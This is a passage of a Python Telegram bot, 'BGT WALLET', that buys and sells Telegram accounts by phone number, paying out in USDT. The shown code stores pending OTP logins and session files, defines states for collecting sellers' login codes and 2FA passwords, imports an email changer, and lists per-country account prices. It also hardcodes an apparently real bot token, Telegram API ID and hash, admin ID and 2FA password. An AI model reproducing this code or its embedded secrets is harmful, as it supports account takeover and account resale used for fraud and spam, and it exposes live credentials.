#!/usr/bin/env python3
"""
Telegram Bot for Account Trading and Balance Management
"""

import os
import io
import zipfile
import threading
import logging
import json
import re
import html
import asyncio
from datetime import datetime
from typing import Dict, Any

import importlib
from telethon import TelegramClient, events, errors, functions, types
from email_changer import change_email_for_number

# Dynamic imports to avoid Replit auto-installer detecting 'telegram' package
tg = importlib.import_module("telegram")
tg_ext = importlib.import_module("telegram.ext")
tg_constants = importlib.import_module("telegram.constants")
# ... existing imports ...
Update = tg.Update
InlineKeyboardButton = tg.InlineKeyboardButton
InlineKeyboardMarkup = tg.InlineKeyboardMarkup
ReplyKeyboardMarkup = tg.ReplyKeyboardMarkup
KeyboardButton = tg.KeyboardButton
KeyboardButtonStyle = tg_constants.KeyboardButtonStyle
Application = tg_ext.Application
CommandHandler = tg_ext.CommandHandler
CallbackQueryHandler = tg_ext.CallbackQueryHandler
ContextTypes = tg_ext.ContextTypes
MessageHandler = tg_ext.MessageHandler
ConversationHandler = tg_ext.ConversationHandler
filters = tg_ext.filters

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

# Suppress sensitive logging from HTTP requests
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)
logging.getLogger('telegram.ext').setLevel(logging.WARNING)

logger = logging.getLogger(__name__)

# Verify correct telegram module is loaded
assert hasattr(tg, "Update"), "python-telegram-bot not resolved; ensure 'telegram' package is not installed"
logger.info(f"telegram loaded successfully from python-telegram-bot v{getattr(tg, '__version__', 'n/a')}")

# Simple in-memory data storage (will be replaced with PostgreSQL later)
user_data: Dict[str, Dict[str, Any]] = {}
user_data_lock = threading.Lock()

# ── Pending-login persistence (survives bot restarts mid-OTP-entry) ─────────
PENDING_LOGINS_FILE = os.path.join('sessions', 'pending_logins.json')


def _save_pending_login(user_id: str, phone: str, phone_code_hash: str, session_path: str) -> None:
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    data = {}
    if os.path.exists(PENDING_LOGINS_FILE):
        try:
            with open(PENDING_LOGINS_FILE, 'r') as f:
                data = json.load(f)
        except Exception:
            data = {}
    data[user_id] = {
        'phone': phone,
        'phone_code_hash': phone_code_hash,
        'session_path': session_path,
        'timestamp': datetime.now().isoformat(),
    }
    with open(PENDING_LOGINS_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def _load_pending_login(user_id: str):
    if not os.path.exists(PENDING_LOGINS_FILE):
        return None
    try:
        with open(PENDING_LOGINS_FILE, 'r') as f:
            data = json.load(f)
        return data.get(user_id)
    except Exception:
        return None


def _clear_pending_login(user_id: str) -> None:
    if not os.path.exists(PENDING_LOGINS_FILE):
        return
    try:
        with open(PENDING_LOGINS_FILE, 'r') as f:
            data = json.load(f)
        if user_id in data:
            del data[user_id]
            with open(PENDING_LOGINS_FILE, 'w') as f:
                json.dump(data, f, indent=2)
    except Exception:
        pass

# Pending withdrawal requests storage
pending_withdrawals: Dict[str, Dict[str, Any]] = {}

# Stores active Telethon session info for per-device logout
# {user_id: {'session_path': str, 'sessions': {str(hash): {device, app, country, current}}}}
pending_terminations: Dict[str, Dict] = {}

# Global withdrawal settings
withdrawal_settings: Dict[str, Any] = {
    'global_limit': 1.0,  # Default global minimum withdrawal limit
    'user_limits': {},  # Custom limits per user: {user_id: limit}
    'bot_active': True  # Bot status (active by default)
}

# Per-method minimum withdrawal limits
METHOD_WITHDRAWAL_LIMITS: Dict[str, float] = {
    'bank': 5.0,
    'paypal': 2.0,
    'upi': 0.2,
    'cashapp': 1000.0,
    'bitcoin': 100.0,
    'bep20': 20.0,
    'trc20': 70.0,
    'binance': 25.0,
    'payeer': 30.0
}

def get_method_withdrawal_limit(method: str) -> float:
    """Get the minimum withdrawal limit for a specific payment method"""
    return METHOD_WITHDRAWAL_LIMITS.get(method, 1.0)

def get_combined_withdrawal_limit(user_id: str, user_balance: float, method: str) -> float:
    """Get the combined withdrawal limit considering both method and user-specific limits"""
    method_limit = get_method_withdrawal_limit(method)
    user_limit = get_user_withdrawal_limit(user_id, user_balance)
    return max(method_limit, user_limit)

def get_user_withdrawal_limit(user_id: str, user_balance: float) -> float:
    """Get the withdrawal limit for a user based on their balance and settings"""
    # Check if user has a custom limit set
    if user_id in withdrawal_settings['user_limits']:
        return withdrawal_settings['user_limits'][user_id]
    
    # If user balance is exactly $1 (or very close), return $3
    if abs(user_balance - 1.0) < 0.01:
        return 3.0
    
    # Otherwise return global limit
    return withdrawal_settings['global_limit']

_countries_file_mtime = 0

def load_countries_data():
    """Initialize country data from file or memory"""
    global COUNTRIES_DATA, _countries_file_mtime
    try:
        if os.path.exists('countries_data.json'):
            with open('countries_data.json', 'r') as f:
                data = json.load(f)
                if data:
                    # Replace contents in-place so external references stay valid
                    COUNTRIES_DATA.clear()
                    COUNTRIES_DATA.update(data)
            try:
                _countries_file_mtime = os.path.getmtime('countries_data.json')
            except OSError:
                _countries_file_mtime = 0
            logger.info(f"Loaded country data from file ({len(COUNTRIES_DATA)} countries)")
        else:
            # COUNTRIES_DATA is already initialized with hardcoded values
            logger.info("Using hardcoded country data")
    except Exception as e:
        logger.error(f"Error loading country data: {e}")


def reload_countries_if_changed():
    """Reload countries_data.json if file was modified externally (e.g. from web admin)."""
    global _countries_file_mtime
    try:
        if not os.path.exists('countries_data.json'):
            return False
        mtime = os.path.getmtime('countries_data.json')
        if mtime != _countries_file_mtime:
            with open('countries_data.json', 'r') as f:
                data = json.load(f)
            if data:
                COUNTRIES_DATA.clear()
                COUNTRIES_DATA.update(data)
            _countries_file_mtime = mtime
            logger.info(f"Hot-reloaded country data ({len(COUNTRIES_DATA)} countries)")
            return True
    except Exception as e:
        logger.error(f"Error reloading country data: {e}")
    return False

def save_countries_data():
    """Save country data to file"""
    try:
        with open('countries_data.json', 'w') as f:
            json.dump(COUNTRIES_DATA, f, indent=4)
        logger.info("Saved country data to file")
    except Exception as e:
        logger.error(f"Error saving country data: {e}")

def load_withdrawal_settings():
    """Initialize withdrawal settings from file or memory"""
    global withdrawal_settings
    try:
        if os.path.exists('withdrawal_settings.json'):
            with open('withdrawal_settings.json', 'r') as f:
                withdrawal_settings = json.load(f)
            logger.info("Loaded withdrawal settings from file")
        else:
            withdrawal_settings = {'global_limit': 1.0, 'user_limits': {}}
            logger.info("Initialized withdrawal settings in memory")
    except Exception as e:
        logger.error(f"Error loading withdrawal settings: {e}")
        withdrawal_settings = {'global_limit': 1.0, 'user_limits': {}}

def save_withdrawal_settings():
    """Save withdrawal settings to file"""
    try:
        with open('withdrawal_settings.json', 'w') as f:
            json.dump(withdrawal_settings, f, indent=4)
        logger.info("Saved withdrawal settings to file")
    except Exception as e:
        logger.error(f"Error saving withdrawal settings: {e}")


# ── Blocked numbers (admin can block/unblock specific phone numbers) ──────────
blocked_numbers: set = set()
BLOCKED_NUMBERS_FILE = 'blocked_numbers.json'


def load_blocked_numbers():
    """Load the set of blocked phone numbers from disk."""
    global blocked_numbers
    try:
        if os.path.exists(BLOCKED_NUMBERS_FILE):
            with open(BLOCKED_NUMBERS_FILE, 'r') as f:
                data = json.load(f)
                blocked_numbers = set(data) if isinstance(data, list) else set()
            logger.info(f"Loaded {len(blocked_numbers)} blocked numbers")
        else:
            blocked_numbers = set()
    except Exception as e:
        logger.error(f"Error loading blocked numbers: {e}")
        blocked_numbers = set()


def save_blocked_numbers():
    """Persist the blocked numbers set to disk."""
    try:
        with open(BLOCKED_NUMBERS_FILE, 'w') as f:
            json.dump(sorted(blocked_numbers), f, indent=2)
    except Exception as e:
        logger.error(f"Error saving blocked numbers: {e}")


def normalize_phone(num: str) -> str:
    """Normalize a phone string for comparison (keep leading + and digits only)."""
    num = num.strip().replace(' ', '').replace('-', '')
    if not num.startswith('+'):
        num = '+' + num.lstrip('+')
    return num

# Conversation states for sell account flow
WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA = range(4)

# Admin settings - loaded from environment variables
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "5810613583")
ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
FORWARD_CHAT_ID = "@CEO_cryfex" # Forward to this ID
TWO_FA_PASSWORD = os.environ.get("TWO_FA_PASSWORD", "2876886938")
TELEGRAM_OFFICIAL_ID = 777000

# Telegram API for UserSession (Telethon/Pyrogram)
TELEGRAM_API_ID = int(os.environ.get("TELEGRAM_API_ID", "31955122"))
TELEGRAM_API_HASH = os.environ.get("TELEGRAM_API_HASH", "4f3e7f6d8250dc14c21ae58642fcbcc9")

# Bot Token
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8467555740:AAGcgvy676aczWCPxMvAaVxhsaxBgWZ8WoM")

# Required channel for all users
REQUIRED_CHANNEL = "@BGTUpdate"
REQUIRED_CHANNEL_LINK = "https://t.me/BGTUpdate"

# ─── TRANSLATIONS ────────────────────────────────────────────────────────────
TRANSLATIONS = {
    'en': {
        'lang_select': "🌍 *Welcome!* Please choose your language:",
        'lang_flag': "🇬🇧 English",
        'welcome': (
            "🌟 *WELCOME TO BGT WALLET* 🌟\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Hello {name}! 👋\n\n"
            "Manage your digital assets and account sales with professional speed and security.\n\n"
            "💰 *Main Balance:* {main_bal:.2f} USDT\n"
            "⏳ *Hold Balance:* {hold_bal:.2f} USDT\n\n"
            "🚀 Select an option below to get started:"
        ),
        'menu_dashboard': "Main Dashboard Menu:",
        'invalid_address': (
            "❌ *Invalid Address!*\n\n"
            "The address you entered is not valid for *{method}* network.\n\n"
            "• BEP20 address must start with `0x` and be 42 characters.\n"
            "• TRC20 address must start with `T` and be 34 characters.\n\n"
            "Withdrawal has been *cancelled*. Please start again."
        ),
        'withdraw_cancelled': "❌ Withdrawal cancelled. Returning to main menu...",
        'enter_address': "Please enter your USDT ({method}) address:",
        'confirm_address': "Your address: `{address}`\n\nEnter the amount to withdraw:\n(Your main balance: {balance:.2f} USDT)",
        'invalid_amount': "❌ Invalid amount. Please enter a number.",
        'min_withdraw': "❌ Minimum withdrawal 10 USDT\nWithdrawal cancelled.",
        'insufficient': "❌ Insufficient balance! Your balance: {balance:.2f} USDT\nWithdrawal cancelled.",
    },
    'bn': {
        'lang_select': "🌍 *স্বাগতম!* আপনার ভাষা বেছে নিন:",
        'lang_flag': "🇧🇩 বাংলা",
        'welcome': (
            "🌟 *BGT WALLET-এ স্বাগতম* 🌟\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "হ্যালো {name}! 👋\n\n"
            "পেশাদার গতি ও নিরাপত্তার সাথে আপনার ডিজিটাল সম্পদ ও অ্যাকাউন্ট পরিচালনা করুন।\n\n"
            "💰 *মূল ব্যালেন্স:* {main_bal:.2f} USDT\n"
            "⏳ *হোল্ড ব্যালেন্স:* {hold_bal:.2f} USDT\n\n"
            "🚀 শুরু করতে নিচে একটি বিকল্প বেছে নিন:"
        ),
        'menu_dashboard': "প্রধান মেনু:",
        'invalid_address': (
            "❌ *অবৈধ ঠিকানা!*\n\n"
            "আপনি যে ঠিকানাটি দিয়েছেন সেটি *{method}* নেটওয়ার্কের জন্য সঠিক নয়।\n\n"
            "• BEP20 ঠিকানা অবশ্যই `0x` দিয়ে শুরু হতে হবে এবং ৪২ অক্ষরের হতে হবে।\n"
            "• TRC20 ঠিকানা অবশ্যই `T` দিয়ে শুরু হতে হবে এবং ৩৪ অক্ষরের হতে হবে।\n\n"
            "উইথড্রয়াল *বাতিল* করা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।"
        ),
        'withdraw_cancelled': "❌ উইথড্রয়াল বাতিল হয়েছে। প্রধান মেনুতে ফিরে যাচ্ছি...",
        'enter_address': "আপনার USDT ({method}) ঠিকানা লিখুন:",
        'confirm_address': "আপনার ঠিকানা: `{address}`\n\nউইথড্রয়াল পরিমাণ লিখুন:\n(আপনার মূল ব্যালেন্স: {balance:.2f} USDT)",
        'invalid_amount': "❌ অবৈধ পরিমাণ। একটি সংখ্যা লিখুন।",
        'min_withdraw': "❌ সর্বনিম্ন উইথড্রয়াল ১০ USDT\nউইথড্রয়াল বাতিল।",
        'insufficient': "❌ অপর্যাপ্ত ব্যালেন্স! আপনার ব্যালেন্স: {balance:.2f} USDT\nউইথড্রয়াল বাতিল।",
    },
    'ar': {
        'lang_select': "🌍 *مرحباً!* يرجى اختيار لغتك:",
        'lang_flag': "🇸🇦 العربية",
        'welcome': (
            "🌟 *مرحباً بك في BGT WALLET* 🌟\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "مرحباً {name}! 👋\n\n"
            "أدر أصولك الرقمية ومبيعات حساباتك باحترافية وأمان.\n\n"
            "💰 *الرصيد الرئيسي:* {main_bal:.2f} USDT\n"
            "⏳ *الرصيد المحجوز:* {hold_bal:.2f} USDT\n\n"
            "🚀 اختر خياراً أدناه للبدء:"
        ),
        'menu_dashboard': "القائمة الرئيسية:",
        'invalid_address': (
            "❌ *عنوان غير صالح!*\n\n"
            "العنوان الذي أدخلته غير صالح لشبكة *{method}*.\n\n"
            "• عنوان BEP20 يجب أن يبدأ بـ `0x` ويكون 42 حرفاً.\n"
            "• عنوان TRC20 يجب أن يبدأ بـ `T` ويكون 34 حرفاً.\n\n"
            "تم *إلغاء* عملية السحب. يرجى المحاولة مرة أخرى."
        ),
        'withdraw_cancelled': "❌ تم إلغاء السحب. العودة إلى القائمة الرئيسية...",
        'enter_address': "أدخل عنوان USDT ({method}) الخاص بك:",
        'confirm_address': "عنوانك: `{address}`\n\nأدخل المبلغ للسحب:\n(رصيدك الرئيسي: {balance:.2f} USDT)",
        'invalid_amount': "❌ مبلغ غير صالح. أدخل رقماً.",
        'min_withdraw': "❌ الحد الأدنى للسحب 10 USDT\nتم إلغاء السحب.",
        'insufficient': "❌ رصيد غير كافٍ! رصيدك: {balance:.2f} USDT\nتم إلغاء السحب.",
    },
    'ru': {
        'lang_select': "🌍 *Добро пожаловать!* Пожалуйста, выберите язык:",
        'lang_flag': "🇷🇺 Русский",
        'welcome': (
            "🌟 *ДОБРО ПОЖАЛОВАТЬ В BGT WALLET* 🌟\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Привет, {name}! 👋\n\n"
            "Управляйте своими цифровыми активами и продажами аккаунтов профессионально и безопасно.\n\n"
            "💰 *Основной баланс:* {main_bal:.2f} USDT\n"
            "⏳ *Замороженный баланс:* {hold_bal:.2f} USDT\n\n"
            "🚀 Выберите опцию ниже:"
        ),
        'menu_dashboard': "Главное меню:",
        'invalid_address': (
            "❌ *Неверный адрес!*\n\n"
            "Введённый вами адрес недействителен для сети *{method}*.\n\n"
            "• Адрес BEP20 должен начинаться с `0x` и содержать 42 символа.\n"
            "• Адрес TRC20 должен начинаться с `T` и содержать 34 символа.\n\n"
            "Вывод *отменён*. Пожалуйста, начните заново."
        ),
        'withdraw_cancelled': "❌ Вывод отменён. Возврат в главное меню...",
        'enter_address': "Введите ваш адрес USDT ({method}):",
        'confirm_address': "Ваш адрес: `{address}`\n\nВведите сумму для вывода:\n(Ваш основной баланс: {balance:.2f} USDT)",
        'invalid_amount': "❌ Неверная сумма. Пожалуйста, введите число.",
        'min_withdraw': "❌ Минимальный вывод 10 USDT\nВывод отменён.",
        'insufficient': "❌ Недостаточно средств! Ваш баланс: {balance:.2f} USDT\nВывод отменён.",
    },
}

def get_user_lang(user_id: str) -> str:
    """Return user's chosen language code (default 'en')."""
    with user_data_lock:
        return user_data.get(user_id, {}).get('language', 'en')

def t(key: str, user_id: str, **kwargs) -> str:
    """Get translated text for a key in user's language."""
    lang = get_user_lang(user_id)
    text = TRANSLATIONS.get(lang, TRANSLATIONS['en']).get(key, TRANSLATIONS['en'].get(key, key))
    if kwargs:
        text = text.format(**kwargs)
    return text

def validate_usdt_address(address: str, method: str) -> bool:
    """Validate USDT address format for BEP20 or TRC20."""
    method = method.upper()
    if method == 'BEP20':
        return bool(re.match(r'^0x[0-9a-fA-F]{40}$', address))
    elif method == 'TRC20':
        return bool(re.match(r'^T[1-9A-HJ-NP-Za-km-z]{33}$', address))
    return True  # For unknown methods, allow any address
# ─────────────────────────────────────────────────────────────────────────────

# Admin conversation states  
WAITING_FOR_USER_ID, WAITING_FOR_AMOUNT = range(3, 5)

# Country data with user-specified countries and separate buy/sell prices (updated from uploaded file)
COUNTRIES_DATA = {
    'italy': {'name': 'Italy 🇮🇹', 'sell_price': 2.9, 'buy_price': 3.77},
    'mexico': {'name': 'Mexico 🇲🇽', 'sell_price': 0.70, 'buy_price': 0.91},
    'kazakhstan': {'name': 'Kazakhstan 🇰🇿', 'sell_price': 1.0, 'buy_price': 1.3},
    'russia': {'name': 'Russia 🇷🇺', 'sell_price': 1.3, 'buy_price': 1.69},
    'ukraine': {'name': 'Ukraine 🇺🇦', 'sell_price': 1.0, 'buy_price': 1.3},
    'yemen': {'name': 'Yemen 🇾🇪', 'sell_price': 0.60, 'buy_price': 0.78},
    'latvia': {'name': 'Latvia 🇱🇻', 'sell_price': 0.50, 'buy_price': 0.65},
    'sierra_leone': {'name': 'Sierra Leone 🇸🇱', 'sell_price': 0.45, 'buy_price': 0.59},
    'kyrgyzstan': {'name': 'Kyrgyzstan 🇰🇬', 'sell_price': 1.0, 'buy_price': 1.3},
    'usa': {'name': 'United States 🇺🇸', 'sell_price': 0.22, 'buy_price': 0.29},
    'egypt': {'name': 'Egypt 🇪🇬', 'sell_price': 0.45, 'buy_price': 0.59},
    'iraq': {'name': 'Iraq 🇮🇶', 'sell_price': 0.60, 'buy_price': 0.78},
    'saudi_arabia': {'name': 'Saudi Arabia 🇸🇦', 'sell_price': 2.3, 'buy_price': 2.99},
    'turkey': {'name': 'Turkey 🇹🇷', 'sell_price': 1.0, 'buy_price': 1.3},
    'venezuela': {'name': 'Venezuela 🇻🇪', 'sell_price': 0.50, 'buy_price': 0.65},
    'france': {'name': 'France 🇫🇷', 'sell_price': 1.5, 'buy_price': 1.95},
    'argentina': {'name': 'Argentina 🇦🇷', 'sell_price': 0.60, 'buy_price': 0.78},
    'netherlands': {'name': 'Netherlands 🇳🇱', 'sell_price': 1.0, 'buy_price': 1.3},
    'england': {'name': '🇬🇧 England', 'sell_price': 0.75, 'buy_price': 0.98},
    'uzbekistan': {'name': 'Uzbekistan 🇺🇿', 'sell_price': 0.80, 'buy_price': 1.04},
    'hong_kong': {'name': 'Hong Kong 🇭🇰', 'sell_price': 0.65, 'buy_price': 0.85},
    'thailand': {'name': 'Thailand 🇹🇭', 'sell_price': 0.70, 'buy_price': 0.91},
    'samoa': {'name': 'Samoa 🇼🇸', 'sell_price': 0.70, 'buy_price': 0.91},
    'spain': {'name': 'Spain 🇪🇸', 'sell_price': 1.5, 'buy_price': 1.95},
    'tunisia': {'name': 'Tunisia 🇹🇳', 'sell_price': 0.40, 'buy_price': 0.52},
    'senegal': {'name': 'Senegal 🇸🇳', 'sell_price': 0.50, 'buy_price': 0.65},
    'morocco': {'name': 'Morocco 🇲🇦', 'sell_price': 0.30, 'buy_price': 0.39},
    'india': {'name': 'India 🇮🇳', 'sell_price': 0.35, 'buy_price': 0.46},
    'lebanon': {'name': 'Lebanon 🇱🇧', 'sell_price': 0.70, 'buy_price': 0.91},
    'vietnam': {'name': 'Vietnam 🇻🇳', 'sell_price': 0.35, 'buy_price': 0.46},
    'ghana': {'name': 'Ghana 🇬🇭', 'sell_price': 0.35, 'buy_price': 0.46},
    'iran': {'name': 'Iran 🇮🇷', 'sell_price': 0.70, 'buy_price': 0.91},
    'uae': {'name': 'Uni Emirat Arab 🇦🇪', 'sell_price': 1.0, 'buy_price': 1.3},
    'georgia': {'name': 'Georgia 🇬🇪', 'sell_price': 0.60, 'buy_price': 0.78},
    'mali': {'name': 'Mali 🇲🇱', 'sell_price': 0.44, 'buy_price': 0.57},
    'portugal': {'name': 'Portugal 🇵🇹', 'sell_price': 1.0, 'buy_price': 1.3},
    'babo': {'name': 'Babo 🇵🇬', 'sell_price': 0.60, 'buy_price': 0.78},
    'niger': {'name': 'Niger 🇳🇪', 'sell_price': 0.50, 'buy_price': 0.65},
    'pakistan': {'name': 'Pakistan 🇵🇰', 'sell_price': 0.35, 'buy_price': 0.46},
    'peru': {'name': 'Peru 🇵🇪', 'sell_price': 0.80, 'buy_price': 1.04},
    'afghanistan': {'name': 'Afghanistan 🇦🇫', 'sell_price': 0.55, 'buy_price': 0.72},
    'tanzania': {'name': 'Tanzania 🇹🇿', 'sell_price': 0.37, 'buy_price': 0.48},
    'zimbabwe': {'name': 'Zimbabwe 🇿🇼', 'sell_price': 0.46, 'buy_price': 0.60},
    'guatemala': {'name': 'Guatemala 🇬🇹', 'sell_price': 0.90, 'buy_price': 1.17},
    'sri_lanka': {'name': 'Sri Lanka 🇱🇰', 'sell_price': 0.50, 'buy_price': 0.65},
    'jordan': {'name': 'Jordan 🇯🇴', 'sell_price': 1.0, 'buy_price': 1.3},
    'syria': {'name': 'Syria 🇸🇾', 'sell_price': 0.65, 'buy_price': 0.85},
    'indonesia': {'name': 'Indonesia 🇮🇩', 'sell_price': 0.35, 'buy_price': 0.46},
    'cambodia': {'name': 'Cambodia 🇰🇭', 'sell_price': 0.40, 'buy_price': 0.52},
    'sudan': {'name': 'Sudan 🇸🇩', 'sell_price': 0.55, 'buy_price': 0.72},
    'puerto_rico': {'name': 'Puerto Rico 🇵🇷', 'sell_price': 0.45, 'buy_price': 0.59},
    'timor': {'name': 'Timor 🇹🇱', 'sell_price': 0.50, 'buy_price': 0.65},
    'taiwan': {'name': 'Taiwan 🇹🇼', 'sell_price': 1.0, 'buy_price': 1.3},
    'sweden': {'name': 'Sweden 🇸🇪', 'sell_price': 0.80, 'buy_price': 1.04},
    'estonia': {'name': 'Estonia 🇪🇪', 'sell_price': 0.85, 'buy_price': 1.11},
    'laos': {'name': 'Laos 🇱🇦', 'sell_price': 0.70, 'buy_price': 0.91},
    'nigeria': {'name': 'Nigeria 🇳🇬', 'sell_price': 0.25, 'buy_price': 0.33},
    'israel': {'name': 'Israel 🇮🇱', 'sell_price': 0.75, 'buy_price': 0.98},
    'china': {'name': 'China 🇨🇳', 'sell_price': 0.80, 'buy_price': 1.04},
    'philippines': {'name': 'Philippines 🇵🇭', 'sell_price': 0.50, 'buy_price': 0.65},
    'malaysia': {'name': 'Malaysia 🇲🇾', 'sell_price': 1.45, 'buy_price': 1.89},
    'madagascar': {'name': 'Madagascar 🇲🇬', 'sell_price': 0.47, 'buy_price': 0.61},
    'ireland': {'name': 'Ireland 🇮🇪', 'sell_price': 0.55, 'buy_price': 0.72},
    'austria': {'name': 'Austria 🇦🇹', 'sell_price': 0.70, 'buy_price': 0.91},
    'serbia': {'name': 'Serbia 🇷🇸', 'sell_price': 0.50, 'buy_price': 0.65},
    'romania': {'name': 'Romania 🇷🇴', 'sell_price': 1.0, 'buy_price': 1.3},
    'slovenia': {'name': 'Slovenia 🇸🇮', 'sell_price': 0.60, 'buy_price': 0.78},
    'ethiopia': {'name': 'Ethiopia 🇪🇹', 'sell_price': 0.35, 'buy_price': 0.46},
    'nicaragua': {'name': 'Nicaragua 🇳🇮', 'sell_price': 0.60, 'buy_price': 0.78},
    'paraguay': {'name': 'Paraguay 🇵🇾', 'sell_price': 0.55, 'buy_price': 0.72},
    'hungary': {'name': 'Hungary 🇭🇺', 'sell_price': 0.50, 'buy_price': 0.65},
    'nepal': {'name': 'Nepal 🇳🇵', 'sell_price': 0.24, 'buy_price': 0.31},
    'uganda': {'name': 'Uganda 🇺🇬', 'sell_price': 0.44, 'buy_price': 0.57},
    'mongolia': {'name': 'Mongolia 🇲🇳', 'sell_price': 0.77, 'buy_price': 1.0},
    'belarus': {'name': 'Belarus 🇧🇾', 'sell_price': 0.60, 'buy_price': 0.78},
    'canada': {'name': 'Canada 🇨🇦', 'sell_price': 0.39, 'buy_price': 0.51},
    'colombia': {'name': 'Colombia 🇨🇴', 'sell_price': 0.40, 'buy_price': 0.52},
    'croatia': {'name': 'Croatia 🇭🇷', 'sell_price': 0.50, 'buy_price': 0.65},
    'poland': {'name': 'Poland 🇵🇱', 'sell_price': 0.80, 'buy_price': 1.04},
    'kenya': {'name': 'Kenya 🇰🇪', 'sell_price': 0.35, 'buy_price': 0.46},
    'el_salvador': {'name': 'El Salvador 🇸🇻', 'sell_price': 0.60, 'buy_price': 0.78},
    'myanmar': {'name': 'Myanmar 🇲🇲', 'sell_price': 0.35, 'buy_price': 0.46},
    'libya': {'name': 'Libya 🇱🇾', 'sell_price': 0.80, 'buy_price': 1.04},
    'bolivia': {'name': 'Bolivia 🇧🇴', 'sell_price': 0.30, 'buy_price': 0.39},
    'fiji': {'name': 'Fiji 🇫🇯', 'sell_price': 1.0, 'buy_price': 1.3},
    'tonga': {'name': 'Tonga 🇹🇴', 'sell_price': 0.60, 'buy_price': 0.78},
    'costa_rica': {'name': 'Costa Rica 🇨🇷', 'sell_price': 0.35, 'buy_price': 0.46},
    'honduras': {'name': 'Honduras 🇭🇳', 'sell_price': 0.30, 'buy_price': 0.39},
    'japan': {'name': 'Japan 🇯🇵', 'sell_price': 1.2, 'buy_price': 1.56},
    'norway': {'name': 'Norway 🇳🇴', 'sell_price': 1.2, 'buy_price': 1.56},
    'australia': {'name': 'Australia 🇦🇺', 'sell_price': 0.5, 'buy_price': 0.65},
    'switzerland': {'name': 'Switzerland 🇨🇭', 'sell_price': 1.0, 'buy_price': 1.3},
    'denmark': {'name': 'Denmark 🇩🇰', 'sell_price': 1.2, 'buy_price': 1.56},
    'chile': {'name': 'Chile 🇨🇱', 'sell_price': 0.50, 'buy_price': 0.65},
    'benin': {'name': 'Benin 🇧🇯', 'sell_price': 0.30, 'buy_price': 0.39},
    'burundi': {'name': 'Burundi 🇧🇮', 'sell_price': 0.40, 'buy_price': 0.52},
    'cuba': {'name': 'Cuba 🇨🇺', 'sell_price': 0.65, 'buy_price': 0.85},
    'panama': {'name': 'Panama 🇵🇦', 'sell_price': 0.40, 'buy_price': 0.52},
    'qatar': {'name': 'Qatar 🇶🇦', 'sell_price': 1.6, 'buy_price': 2.08},
    'oman': {'name': 'Oman 🇴🇲', 'sell_price': 1.4, 'buy_price': 1.82},
    'kuwait': {'name': 'Kuwait 🇰🇼', 'sell_price': 2.2, 'buy_price': 2.86},
    'togo': {'name': 'Togo 🇹🇬', 'sell_price': 0.45, 'buy_price': 0.59},
    'armenia': {'name': 'Armenia 🇦🇲', 'sell_price': 0.60, 'buy_price': 0.78},
    'bangladesh': {'name': 'Bangladesh 🇧🇩', 'sell_price': 0.65, 'buy_price': 0.85},
    'mozambique': {'name': 'Mozambique 🇲🇿', 'sell_price': 0.40, 'buy_price': 0.52},
    'angola': {'name': 'Angola 🇦🇴', 'sell_price': 0.35, 'buy_price': 0.46},
    'chad': {'name': 'Chad 🇹🇩', 'sell_price': 0.40, 'buy_price': 0.52},
    'algeria': {'name': 'Algeria 🇩🇿', 'sell_price': 0.40, 'buy_price': 0.52},
    'guinea': {'name': 'Guinea 🇬🇳', 'sell_price': 0.30, 'buy_price': 0.39},
    'singapore': {'name': 'Singapore 🇸🇬', 'sell_price': 1.2, 'buy_price': 1.56},
    'malta': {'name': 'Malta 🇲🇹', 'sell_price': 1.5, 'buy_price': 1.95},
    'turkmenistan': {'name': 'Turkmenistan 🇹🇲', 'sell_price': 0.75, 'buy_price': 0.98},
    'bermuda': {'name': 'Bermuda 🇧🇲', 'sell_price': 0.60, 'buy_price': 0.78},
    'bahrain': {'name': 'Bahrain 🇧🇭', 'sell_price': 1.3, 'buy_price': 1.69},
    'germany': {'name': 'Germany 🇩🇪', 'sell_price': 2.0, 'buy_price': 2.6},
    'brazil': {'name': 'Brazil 🇧🇷', 'sell_price': 1.0, 'buy_price': 1.3},
    'maldives': {'name': 'Maldives 🇲🇻', 'sell_price': 1.0, 'buy_price': 1.3},
    'czech_republic': {'name': 'Czech Republic 🇨🇿', 'sell_price': 0.85, 'buy_price': 1.11},
    'moldova': {'name': 'Moldova 🇲🇩', 'sell_price': 0.70, 'buy_price': 0.91},
    'belgium': {'name': 'Belgium 🇧🇪', 'sell_price': 1.0, 'buy_price': 1.3},
    'new_zealand': {'name': 'New Zealand 🇳🇿', 'sell_price': 0.60, 'buy_price': 0.78},
    'cameroon': {'name': 'Cameroon 🇨🇲', 'sell_price': 0.35, 'buy_price': 0.46},
    'macau': {'name': 'Macau 🇲🇴', 'sell_price': 0.80, 'buy_price': 1.04},
    'solomon_islands': {'name': 'Solomon Islands 🇸🇧', 'sell_price': 0.80, 'buy_price': 1.04},
    'aruba': {'name': 'Aruba 🇦🇼', 'sell_price': 1.2, 'buy_price': 1.56},
    'djibouti': {'name': 'Djibouti 🇩🇯', 'sell_price': 0.60, 'buy_price': 0.78},
    'albania': {'name': 'Albania 🇦🇱', 'sell_price': 1.0, 'buy_price': 1.3},
    'monaco': {'name': 'Monaco 🇲🇨', 'sell_price': 1.5, 'buy_price': 1.95},
    'comoros': {'name': 'Comoros 🇰🇲', 'sell_price': 0.65, 'buy_price': 0.85},
    'iceland': {'name': 'Iceland 🇮🇸', 'sell_price': 0.65, 'buy_price': 0.85},
    'bosnia': {'name': 'Bosnia 🇧🇦', 'sell_price': 0.65, 'buy_price': 0.85},
    'dominican': {'name': 'Dominican 🇩🇴', 'sell_price': 0.50, 'buy_price': 0.65},
    'ecuador': {'name': 'Ecuador 🇪🇨', 'sell_price': 0.60, 'buy_price': 0.78},
